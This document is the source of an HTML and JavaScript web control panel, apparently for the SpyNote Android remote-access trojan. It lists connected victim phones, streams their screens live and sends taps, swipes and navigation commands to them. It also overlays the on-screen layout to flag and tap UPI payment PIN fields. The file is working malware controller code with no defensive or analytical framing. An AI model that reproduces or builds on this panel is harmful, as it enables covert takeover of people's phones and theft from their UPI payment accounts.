<!DOCTYPE html>
<html>
<head>
    <title>üì± SpyNote - UPI Control Panel</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="/socket.io/socket.io.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif; 
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 50%, #16213e 100%); 
            color: white; height: 100vh; overflow: hidden;
        }
        #devices {
            position: fixed; top: 20px; left: 20px; background: rgba(0,0,0,0.95); 
            padding: 25px; max-height: 80vh; overflow-y: auto; width: 300px; 
            border-radius: 20px; backdrop-filter: blur(25px); border: 1px solid #333;
            box-shadow: 0 20px 40px rgba(0,0,0,0.5);
        }
        .device { padding: 20px; margin: 12px 0; background: #222; cursor: pointer; 
            border-radius: 15px; transition: all 0.3s; border: 1px solid #444; }
        .device:hover { background: #444; transform: translateX(10px); box-shadow: 0 10px 30px rgba(0,255,136,0.3); }
        .active { background: linear-gradient(45deg, #00ff88, #00cc6a) !important; color: #000; 
            box-shadow: 0 0 30px #00ff88 !important; animation: pulse 2s infinite; }
        @keyframes pulse { 0%, 100% { box-shadow: 0 0 30px #00ff88; } 50% { box-shadow: 0 0 50px #00ff88; } }
        .disconnected { opacity: 0.4; }

        #phone-frame {
            width: 400px; height: 850px; margin: 40px auto; 
            background: linear-gradient(145deg, #111, #222); border: 35px solid #1a1a1a; 
            border-radius: 70px; position: relative; cursor: pointer; touch-action: none;
            box-shadow: 0 30px 60px rgba(0,0,0,0.8), inset 0 0 30px rgba(255,255,255,0.05);
        }
        #screen-canvas { 
            width: 100%; height: 100%; background: #000; border-radius: 30px;
            image-rendering: -webkit-optimize-contrast; image-rendering: crisp-edges;
        }
        #layout-overlay {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%; 
            pointer-events: none; border-radius: 30px; z-index: 20;
        }
        .layout-element {
            position: absolute; background: rgba(0,255,136,0.25); border: 3px solid #00ff88;
            border-radius: 8px; transition: all 0.2s; cursor: pointer;
        }
        .layout-element:hover { background: rgba(0,255,136,0.5); transform: scale(1.05); box-shadow: 0 0 20px #00ff88; }
        .pin-element { background: rgba(255,100,100,0.5) !important; border-color: #ff6666 !important; 
            box-shadow: 0 0 20px rgba(255,100,100,0.6) !important; }

        #stats { 
            position: fixed; top: 20px; right: 20px; background: rgba(0,0,0,0.95); 
            padding: 20px; border-radius: 15px; font-size: 14px; text-align: center; 
            backdrop-filter: blur(20px); border: 1px solid #333; min-width: 200px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.5);
        }
        #controls { 
            position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%); 
            display: flex; gap: 15px; background: rgba(0,0,0,0.95); padding: 20px 30px;
            border-radius: 40px; backdrop-filter: blur(25px); border: 1px solid #444;
            box-shadow: 0 20px 40px rgba(0,0,0,0.6);
        }
        button {
            padding: 15px 25px; background: linear-gradient(45deg, #007bff, #0056b3); 
            color: white; border: none; border-radius: 25px; cursor: pointer; 
            font-weight: 600; font-size: 14px; transition: all 0.3s; 
            box-shadow: 0 8px 25px rgba(0,123,255,0.4);
        }
        button:hover { transform: translateY(-4px); box-shadow: 0 12px 35px rgba(0,123,255,0.6); }
        button:active { transform: translateY(-1px); }
        .layout-toggle { background: linear-gradient(45deg, #ff6b6b, #ee5a5a); }
        .layout-toggle.active { background: linear-gradient(45deg, #00ff88, #00cc6a); }
    </style>
</head>
<body>
    <div id="devices">
        <h3 style="margin-bottom: 20px; color: #00ff88; text-align: center;">üì± Devices Online</h3>
        <div id="device-list">üîÑ Loading devices...</div>
    </div>
    
    <div id="stats">
        <div>Status: <span id="status" style="color: #ff6b6b;">Connecting...</span></div>
        <div>FPS: <span id="fps">0</span> | Ping: <span id="ping">-</span>ms</div>
        <div>Device: <span id="deviceName">-</span></div>
        <div id="layoutInfo" style="font-size: 12px; color: #aaa;">Layout: OFF</div>
        <div id="pinCount" style="font-size: 12px; color: #ff6666;">PINs: 0</div>
    </div>

    <div id="phone-frame">
        <canvas id="screen-canvas"></canvas>
        <canvas id="layout-overlay"></canvas>
    </div>

    <div id="controls">
        <button onclick="sendBack()" title="Back Button">üîô Back</button>
        <button onclick="sendHome()" title="Home Button">üè† Home</button>
        <button class="layout-toggle" onclick="toggleLayout()" id="layoutBtn" title="Toggle UPI Layout">üó∫Ô∏è Layout</button>
        <button onclick="toggleFullScreen()" title="Fullscreen">üì± Full</button>
    </div>

    <script>
        const socket = io({ transports: ['websocket'] });
        let currentDevice = null;
        let deviceWidth = 1080, deviceHeight = 2340;
        let frameCount = 0, lastFrameTime = 0, avgFps = 0;
        let frameQueue = [];
        let isDragging = false, dragStart = {};
        let showLayout = false;
        let layoutElements = [];
        let canvas, overlayCanvas, phoneFrame;

        canvas = document.getElementById('screen-canvas');
        overlayCanvas = document.getElementById('layout-overlay');
        phoneFrame = document.getElementById('phone-frame');

        socket.on('connect', () => {
            document.getElementById('status').textContent = 'üü¢ LIVE';
            document.getElementById('status').style.color = '#00ff88';
        });

        socket.on('devices-update', (devices) => {
            updateDeviceList(devices);
        });

        socket.on('screen-update', (data) => {
            if (data.deviceId !== currentDevice) return;
            frameQueue.push(data);
            if (frameQueue.length === 1) renderNextFrame();
            
            frameCount++;
            const now = performance.now();
            if (now - lastFrameTime >= 1000) {
                avgFps = Math.round(frameCount * 1000 / (now - lastFrameTime));
                document.getElementById('fps').textContent = avgFps;
                frameCount = 0;
                lastFrameTime = now;
            }
        });

        function renderNextFrame() {
            if (frameQueue.length === 0) return;
            const data = frameQueue.shift();
            const img = new Image();
            
            img.onload = () => {
                const rect = phoneFrame.getBoundingClientRect();
                canvas.width = rect.width;
                canvas.height = rect.height;
                
                const screenCtx = canvas.getContext('2d');
                screenCtx.imageSmoothingEnabled = false;
                screenCtx.clearRect(0, 0, canvas.width, canvas.height);
                screenCtx.drawImage(img, 0, 0, canvas.width, canvas.height);
                
                if (showLayout && data.layout && data.layout.length > 0) {
                    renderLayoutOverlay(data.layout, rect);
                }
                
                if (frameQueue.length > 0) requestAnimationFrame(renderNextFrame);
            };
            img.src = `data:image/jpeg;base64,${data.data}`;
        }

        function renderLayoutOverlay(layout, rect) {
            const overlayCtx = overlayCanvas.getContext('2d');
            overlayCanvas.width = rect.width;
            overlayCanvas.height = rect.height;
            overlayCtx.clearRect(0, 0, rect.width, rect.height);
            layoutElements = [];
            
            let pinCount = 0;
            layout.forEach((element) => {
                const x = (element.bounds.left / deviceWidth) * rect.width;
                const y = (element.bounds.top / deviceHeight) * rect.height;
                const w = ((element.bounds.right - element.bounds.left) / deviceWidth) * rect.width;
                const h = ((element.bounds.bottom - element.bounds.top) / deviceHeight) * rect.height;
                
                const isPin = element.text && /\d/.test(element.text);
                
                overlayCtx.fillStyle = isPin ? 'rgba(255,100,100,0.4)' : 'rgba(0,255,136,0.3)';
                overlayCtx.strokeStyle = isPin ? '#ff6666' : '#00ff88';
                overlayCtx.lineWidth = 3;
                overlayCtx.strokeRect(x, y, w, h);
                overlayCtx.font = 'bold 16px monospace';
                overlayCtx.fillStyle = isPin ? '#ff6666' : '#00ff88';
                overlayCtx.fillText(element.text || '?', x+8, y+25);
                
                layoutElements.push({ 
                    x: x/rect.width * deviceWidth, y: y/rect.height * deviceHeight,
                    w: w/rect.width * deviceWidth, h: h/rect.height * deviceHeight,
                    isPin, element, rect 
                });
                
                if (isPin) pinCount++;
            });
            
            document.getElementById('pinCount').textContent = `PINs: ${pinCount}`;
        }

        function updateDeviceList(devices) {
            document.getElementById('device-list').innerHTML = devices.length ? 
                devices.map(([id, info]) => `
                    <div class="device ${!info.connected ? 'disconnected' : ''}" 
                         onclick="selectDevice('${id}', this)">
                        <b>${(info.model || id.slice(0,12)).replace(/Android/, 'ü§ñ')}</b><br>
                        <small>${info.brand || 'Unknown'}</small><br>
                        <span style="color: ${info.connected ? '#00ff88' : '#ff6b6b'}; font-weight: bold;">
                            ${info.connected ? 'üü¢ LIVE' : 'üî¥ OFFLINE'}
                        </span>
                    </div>
                `).join('') : '<div style="color:#666; text-align:center; padding:40px;">No devices online<br><small>Wait for phone...</small></div>';
        }

        function selectDevice(deviceId, el) {
            currentDevice = deviceId;
            deviceWidth = el.dataset.width || 1080;
            deviceHeight = el.dataset.height || 2340;
            document.getElementById('deviceName').textContent = deviceId.slice(0,12);
            document.querySelectorAll('.device').forEach(d => d.classList.remove('active'));
            el.classList.add('active');
            frameQueue = [];
        }

        function getScaledCoords(clientX, clientY) {
            const rect = phoneFrame.getBoundingClientRect();
            return {
                x: Math.floor((clientX - rect.left) * (deviceWidth / rect.width)),
                y: Math.floor((clientY - rect.top) * (deviceHeight / rect.height))
            };
        }

        // üî• PERFECT TOUCH/MOUSE CONTROLS
        ['mousedown', 'mousemove', 'mouseup', 'click'].forEach(event => {
            phoneFrame.addEventListener(event, handleInputEvent);
        });

        ['touchstart', 'touchmove', 'touchend'].forEach(event => {
            phoneFrame.addEventListener(event, handleInputEvent, { passive: false });
        });

        function handleInputEvent(e) {
            e.preventDefault();
            const touch = e.touches?.[0] || e.changedTouches?.[0] || e;
            const coords = getScaledCoords(touch.clientX, touch.clientY);
            
            if (e.type === 'mousedown' || e.type === 'touchstart') {
                isDragging = true;
                dragStart = coords;
            } else if ((e.type === 'mousemove' || e.type === 'touchmove') && isDragging) {
                socket.emit('control', {
                    deviceId: currentDevice, action: 'swipe',
                    startX: dragStart.x, startY: dragStart.y,
                    endX: coords.x, endY: coords.y, duration: 200
                });
            } else if (e.type === 'mouseup' || e.type === 'touchend' || e.type === 'click') {
                isDragging = false;
                socket.emit('control', {
                    deviceId: currentDevice, action: 'tap',
                    x: coords.x, y: coords.y
                });
            }
        }

        function sendBack() { 
            if (currentDevice) socket.emit('control', { deviceId: currentDevice, action: 'back' }); 
        }
        function sendHome() { 
            if (currentDevice) socket.emit('control', { deviceId: currentDevice, action: 'home' }); 
        }

        function toggleLayout() {
            showLayout = !showLayout;
            const btn = document.getElementById('layoutBtn');
            const info = document.getElementById('layoutInfo');
            btn.classList.toggle('active');
            btn.textContent = showLayout ? 'üìã Hide Layout' : 'üó∫Ô∏è Show Layout';
            info.textContent = `Layout: ${showLayout ? 'ON - UPI PINs Active' : 'OFF'}`;
            info.style.color = showLayout ? '#00ff88' : '#aaa';
        }

        function toggleFullScreen() {
            if (!document.fullscreenElement) {
                document.documentElement.requestFullscreen().catch(() => {});
            } else {
                document.exitFullscreen();
            }
        }

        // üî• UPI PIN DIRECT TAP
        phoneFrame.addEventListener('click', (e) => {
            if (!showLayout || !currentDevice) return;
            const rect = phoneFrame.getBoundingClientRect();
            const x = (e.clientX - rect.left) * (deviceWidth / rect.width);
            const y = (e.clientY - rect.top) * (deviceHeight / rect.height);
            
            const clickedPin = layoutElements.find(el => 
                x >= el.x && x <= el.x + el.w && y >= el.y && y <= el.y + el.h
            );
            
            if (clickedPin && clickedPin.isPin) {
                socket.emit('control', {
                    deviceId: currentDevice, action: 'tap',
                    x: clickedPin.element.bounds.centerX,
                    y: clickedPin.element.bounds.centerY
                });
                console.log('üéØ UPI PIN TAPPED:', clickedPin.element.text);
            }
        });
    </script>
</body>
</html>
